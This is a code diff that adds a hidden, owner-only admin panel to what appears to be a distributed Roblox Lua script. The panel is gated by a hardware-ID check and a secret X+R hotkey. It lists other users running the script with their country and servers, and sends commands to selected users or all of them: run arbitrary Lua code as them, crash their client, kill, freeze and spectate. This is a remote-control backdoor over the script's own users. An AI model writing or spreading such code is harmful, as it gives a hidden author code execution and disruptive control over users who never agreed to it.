+    local closeBtn = aButton(header, "X", UDim2.new(0, 28, 0, 28), ADMIN_GRAY, function()
+        animateClose(function()
+            if panelRef.sg then panelRef.sg:Destroy() end
+            panelRef.sg = nil
+            panelRef.main = nil
+            panelRef.scale = nil
+            if dragConn then dragConn:Disconnect(); dragConn = nil end
+            if endConn then endConn:Disconnect(); endConn = nil end
+        end)
+    end)
+    closeBtn.Position = UDim2.new(1, -36, 0.5, -14)
+
+    local dragging, dragStart, startPos
+    header.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = inp.Position
+            startPos = main.Position
+        end
+    end)
+    if dragConn then dragConn:Disconnect() end
+    dragConn = UserInputService.InputChanged:Connect(function(inp)
+        if dragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = inp.Position - dragStart
+            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    if endConn then endConn:Disconnect() end
+    endConn = UserInputService.InputEnded:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+    end)
+
+    local tabBar = aNew("Frame", {
+        Size = UDim2.new(1, -32, 0, 36), Position = UDim2.new(0, 16, 0, 60),
+        BackgroundColor3 = Color3.fromRGB(18, 12, 16), BorderSizePixel = 0,
+    }, main)
+    aCorner(tabBar, 8)
+
+    local content = aNew("Frame", {
+        Size = UDim2.new(1, -32, 1, -116), Position = UDim2.new(0, 16, 0, 104),
+        BackgroundTransparency = 1,
+    }, main)
+
+    local tabs, tabButtons = {}, {}
+    local activeTab = nil
+    local refreshServersRef = nil
+
+    local setActiveTab
+    setActiveTab = function(name)
+        activeTab = name
+        for n, btn in pairs(tabButtons) do
+            btn.BackgroundColor3 = (n == name) and ADMIN_CRIMSON or ADMIN_TAB_IDLE
+        end
+        for n, f in pairs(tabs) do f.Visible = (n == name) end
+        if name == "Servers" and refreshServersRef then
+            task.spawn(refreshServersRef)
+        end
+    end
+
+    for i, name in ipairs({"User Panel", "All Users", "Servers"}) do
+        local b = aNew("TextButton", {
+            Size = UDim2.new(0, 150, 0, 28),
+            Position = UDim2.new(0, 4 + (i - 1) * 158, 0.5, -14),
+            BackgroundColor3 = ADMIN_TAB_IDLE,
+            BorderSizePixel = 0, Text = name, TextColor3 = ADMIN_WHITE,
+            TextSize = 12, Font = Enum.Font.GothamBold, AutoButtonColor = false,
+        }, tabBar)
+        aCorner(b, 6)
+        b.MouseButton1Click:Connect(function() setActiveTab(name) end)
+        b.MouseEnter:Connect(function()
+            if activeTab ~= name and b.Parent then
+                TweenService:Create(b, TweenInfo.new(0.15), { BackgroundColor3 = ADMIN_TAB_HOVER }):Play()
+            end
+        end)
+        b.MouseLeave:Connect(function()
+            if activeTab ~= name and b.Parent then
+                TweenService:Create(b, TweenInfo.new(0.15), { BackgroundColor3 = ADMIN_TAB_IDLE }):Play()
+            end
+        end)
+        tabButtons[name] = b
+    end
+
+    local serverSel = {}
+    local allSel = {}
+
+    local function getAllSelectedIds()
+        local ids, seen = {}, {}
+        for id in pairs(serverSel) do
+            if not seen[id] then ids[#ids+1] = id; seen[id] = true end
+        end
+        for id in pairs(allSel) do
+            if not seen[id] then ids[#ids+1] = id; seen[id] = true end
+        end
+        return ids
+    end
+
+    local userPanel = aNew("Frame", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false }, content)
+    tabs["User Panel"] = userPanel
+
+    local leftCol = aNew("Frame", { Size = UDim2.new(0, 580, 1, 0), BackgroundTransparency = 1 }, userPanel)
+
+    local serverDrop, serverDropFrame, serverUpdate, serverDD
+    local allDrop, allDropFrame, allUpdate, allDD
+
+    local function refreshSelLabels()
+        if serverUpdate then serverUpdate() end
+        if allUpdate then allUpdate() end
+    end
+
+    serverDrop, serverDropFrame, serverUpdate, serverDD = aDropdown(
+        leftCol, "On my server",
+        function(q) return filterUsers(q, "server") end,
+        serverSel, refreshSelLabels, 20
+    )
+    serverDropFrame.Position = UDim2.new(0, 0, 0, 0)
+    serverDropFrame.Size = UDim2.new(0, 282, 0, 34)
+
+    allDrop, allDropFrame, allUpdate, allDD = aDropdown(
+        leftCol, "All users",
+        function(q) return filterUsers(q, "all") end,
+        allSel, refreshSelLabels, 80
+    )
+    allDropFrame.Position = UDim2.new(0, 298, 0, 0)
+    allDropFrame.Size = UDim2.new(0, 282, 0, 34)
+
+    local clearServerBtn = aButton(leftCol, "Clear server selection", UDim2.new(0, 282, 0, 24), ADMIN_CLEAR_BG, function()
+        for k in pairs(serverSel) do serverSel[k] = nil end
+        refreshSelLabels()
+    end)
+    clearServerBtn.Position = UDim2.new(0, 0, 0, 40)
+    clearServerBtn.TextSize = 11
+
+    local clearAllBtn = aButton(leftCol, "Clear all-users selection", UDim2.new(0, 282, 0, 24), ADMIN_CLEAR_BG, function()
+        for k in pairs(allSel) do allSel[k] = nil end
+        refreshSelLabels()
+    end)
+    clearAllBtn.Position = UDim2.new(0, 298, 0, 40)
+    clearAllBtn.TextSize = 11
+
+    local textInput, textFrame = aInput(leftCol, "Text to display / chat", UDim2.new(1, 0, 0, 34))
+    textFrame.Position = UDim2.new(0, 0, 0, 72)
+
+    local showBtn = aButton(leftCol, "Show centered text", UDim2.new(0.5, -4, 0, 30), ADMIN_GRAY, function()
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "show_text", { text = textInput.Text })
+    end)
+    showBtn.Position = UDim2.new(0, 0, 0, 114)
+
+    local chatBtn = aButton(leftCol, "Send to chat", UDim2.new(0.5, -4, 0, 30), ADMIN_GRAY, function()
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "chat_text", { text = textInput.Text })
+    end)
+    chatBtn.Position = UDim2.new(0.5, 4, 0, 114)
+
+    local codeInput, codeFrame = aCodeInput(leftCol, "Lua code", 34, 110)
+    codeFrame.Position = UDim2.new(0, 0, 0, 152)
+
+    local execBtn = aButton(leftCol, "Run code as user(s)", UDim2.new(1, 0, 0, 30), ADMIN_GRAY, function()
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "exec_code", { code = codeInput.Text })
+    end)
+    execBtn.Position = UDim2.new(0, 0, 0, 194)
+    codeFrame:GetPropertyChangedSignal("Size"):Connect(function()
+        execBtn.Position = UDim2.new(0, 0, 0, codeFrame.Position.Y.Offset + codeFrame.Size.Y.Offset + 8)
+    end)
+
+    local rightCol = aNew("Frame", { Size = UDim2.new(0, 260, 1, 0), Position = UDim2.new(1, -260, 0, 0), BackgroundTransparency = 1 }, userPanel)
+
+    local actTitle = aLabel(rightCol, "Actions", UDim2.new(1, 0, 0, 24), ADMIN_CRIMSON_LIGHT)
+    actTitle.Font = Enum.Font.GothamBold
+    actTitle.TextSize = 14
+
+    local freezeToggle = aToggleButton(rightCol, "Freeze", UDim2.new(1, 0, 0, 30), function(state)
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "freeze", { state = state })
+    end)
+    freezeToggle.Position = UDim2.new(0, 0, 0, 30)
+
+    local invisToggle = aToggleButton(rightCol, "Invisible", UDim2.new(1, 0, 0, 30), function(state)
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "invis", { state = state })
+    end)
+    invisToggle.Position = UDim2.new(0, 0, 0, 66)
+
+    local spectateToggle = aToggleButton(rightCol, "Spectate", UDim2.new(1, 0, 0, 30), function(state)
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "spectate", { state = state })
+    end)
+    spectateToggle.Position = UDim2.new(0, 0, 0, 102)
+
+    local killBtn = aButton(rightCol, "Kill", UDim2.new(1, 0, 0, 30), ADMIN_GRAY, function()
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "kill", {})
+    end)
+    killBtn.Position = UDim2.new(0, 0, 0, 142)
+
+    local explodeBtn = aButton(rightCol, "Explode", UDim2.new(1, 0, 0, 30), ADMIN_GRAY, function()
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "explode", {})
+    end)
+    explodeBtn.Position = UDim2.new(0, 0, 0, 180)
+
+    local crashBtn = aButton(rightCol, "Crash user", UDim2.new(1, 0, 0, 30), ADMIN_GRAY, function()
+        local ids = getAllSelectedIds()
+        if #ids == 0 then return end
+        dispatchCommand(ids, "crash", {})
+    end)
+    crashBtn.Position = UDim2.new(0, 0, 0, 218)
+
+    local allPanel = aNew("Frame", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false }, content)
+    tabs["All Users"] = allPanel
+
+    local allLeft = aNew("Frame", { Size = UDim2.new(1, -220, 1, 0), BackgroundTransparency = 1 }, allPanel)
+
+    local allTextInput, allTextFrame = aInput(allLeft, "Text for all users", UDim2.new(1, 0, 0, 34))
+    allTextFrame.Position = UDim2.new(0, 0, 0, 0)
+
+    local allShowBtn = aButton(allLeft, "Show centered text", UDim2.new(0.5, -4, 0, 30), ADMIN_GRAY, function()
+        dispatchCommand(nil, "show_text", { text = allTextInput.Text })
+    end)
+    allShowBtn.Position = UDim2.new(0, 0, 0, 42)
+
+    local allChatBtn = aButton(allLeft, "Send to chat", UDim2.new(0.5, -4, 0, 30), ADMIN_GRAY, function()
+        dispatchCommand(nil, "chat_text", { text = allTextInput.Text })
+    end)
+    allChatBtn.Position = UDim2.new(0.5, 4, 0, 42)
+
+    local allCodeInput, allCodeFrame = aCodeInput(allLeft, "Lua code for all users", 34, 110)
+    allCodeFrame.Position = UDim2.new(0, 0, 0, 84)
+
+    local allExecBtn = aButton(allLeft, "Run code for all users", UDim2.new(1, 0, 0, 34), ADMIN_GRAY, function()
+        dispatchCommand(nil, "exec_code", { code = allCodeInput.Text })
+    end)
+    allExecBtn.Position = UDim2.new(0, 0, 0, 126)
+    allCodeFrame:GetPropertyChangedSignal("Size"):Connect(function()
+        allExecBtn.Position = UDim2.new(0, 0, 0, allCodeFrame.Position.Y.Offset + allCodeFrame.Size.Y.Offset + 8)
+    end)
+
+    local allRight = aNew("Frame", { Size = UDim2.new(0, 200, 1, 0), Position = UDim2.new(1, -200, 0, 0), BackgroundTransparency = 1 }, allPanel)
+
+    local killAllBtn = aButton(allRight, "Kill all users", UDim2.new(1, 0, 0, 34), Color3.fromRGB(150, 20, 40), function()
+        dispatchCommand(nil, "kill", {})
+    end)
+    killAllBtn.Position = UDim2.new(0, 0, 0, 0)
+
+    local servPanel = aNew("Frame", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false }, content)
+    tabs["Servers"] = servPanel
+
+    local servInfo = aLabel(servPanel, "Servers in current game (auto-refresh 1s):", UDim2.new(1, 0, 0, 20), Color3.fromRGB(180, 140, 160))
+    servInfo.Position = UDim2.new(0, 0, 0, 0)
+
+    local servList = aNew("ScrollingFrame", {
+        Size = UDim2.new(1, 0, 1, -30), Position = UDim2.new(0, 0, 0, 26),
+        BackgroundColor3 = Color3.fromRGB(18, 12, 16), BorderSizePixel = 0,
+        ScrollBarThickness = 4, CanvasSize = UDim2.new(0, 0, 0, 0),
+        AutomaticCanvasSize = Enum.AutomaticSize.Y,
+    }, servPanel)
+    aCorner(servList, 8)
+    aNew("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, servList)
+
+    local currentButtons = {}
+
+    local function refreshServers()
+        if not sg.Parent then return end
+        local data = fetchServers(gameIdStr)
+        local servers = data.servers or {}
+        local y = 4
+        local seen = {}
+
+        for _, s in ipairs(servers) do
+            local key = tostring(s.jobId or s.id or math.random())
+            seen[key] = true
+
+            -- FIXED PARSING: все возможные варианты полей
+            local pName = s.username or s.name or s.playerName or s.displayName or "?"
+            local pDisp = s.displayName or s.display_name or s.username or s.name or "?"
+            local sUsers = s.scriptUsers or s.scriptCount or s.count or s.users or s.userCount or "0"
+            local pCountry = s.country or s.countryCode or s.region or s.location or "?"
+            local pPlaceId = s.placeId or s.place_id or placeIdStr
+            local pJobId = s.jobId or s.job_id or s.id or ""
+
+            local sPlayers = s.players
+            if typeof(sPlayers) == "table" then sPlayers = #sPlayers end
+            sPlayers = tostring(sPlayers or s.playerCount or s.player_count or "0")
+
+            local sMax = s.maxPlayers
+            if typeof(sMax) == "table" then sMax = #sMax end
+            sMax = tostring(sMax or s.max_players or s.maxPlayerCount or "0")
+
+            local txt = tostring(pName) .. " (" .. tostring(pDisp) .. ") | " .. tostring(sUsers) .. " | " .. tostring(pCountry) .. " | " .. sPlayers .. "/" .. sMax
+            local btn = currentButtons[key]
+
+            if btn and btn.Parent then
+                btn.Text = txt
+                btn.Position = UDim2.new(0, 4, 0, y)
+            else
+                btn = aButton(servList, txt, UDim2.new(1, -8, 0, 34), ADMIN_GRAY, function()
+                    hopToServer(pPlaceId, pJobId)
+                end)
+                btn.Position = UDim2.new(0, 4, 0, y)
+                btn.TextSize = 11
+                btn.TextXAlignment = Enum.TextXAlignment.Left
+                aNew("UIPadding", { PaddingLeft = UDim.new(0, 16) }, btn)
+                currentButtons[key] = btn
+            end
+            y = y + 38
+        end
+
+        for key, btn in pairs(currentButtons) do
+            if not seen[key] then
+                if btn and btn.Parent then btn:Destroy() end
+                currentButtons[key] = nil
+            end
+        end
+
+        local noServersLabel = servList:FindFirstChild("NoServersLabel")
+        if #servers == 0 then
+            if not noServersLabel then
+                local l = aLabel(servList, "No other servers with our users.", UDim2.new(1, -8, 0, 30), Color3.fromRGB(160, 120, 140))
+                l.Name = "NoServersLabel"
+                l.Position = UDim2.new(0, 4, 0, 4)
+            end
+        else
+            if noServersLabel then noServersLabel:Destroy() end
+        end
+    end
+    refreshServersRef = refreshServers
+
+    task.spawn(function()
+        while sg.Parent do
+            task.wait(1)
+            if not sg.Parent then break end
+            if servPanel.Visible then
+                pcall(refreshServers)
+            end
+        end
+    end)
+
+    task.spawn(function()
+        pcall(getUsersCached)
+    end)
+
+    setActiveTab("User Panel")
+    return sg
+end
+
+local holdingX = false
+UserInputService.InputBegan:Connect(function(inp, processed)
+    if processed then return end
+    if inp.KeyCode == Enum.KeyCode.X then
+        holdingX = true
+    elseif inp.KeyCode == Enum.KeyCode.R and holdingX then
+        if isOwnerHwid then
+            if panelRef.sg and panelRef.sg.Parent then
+                if panelRef.sg.Enabled then
+                    animateClose()
+                else
+                    animateOpen()
+                end
+            else
+                buildAdminPanel()
+            end
+        end
+    end
+end)
+UserInputService.InputEnded:Connect(function(inp)
+    if inp.KeyCode == Enum.KeyCode.X then
+        holdingX = false
+    end
+end)
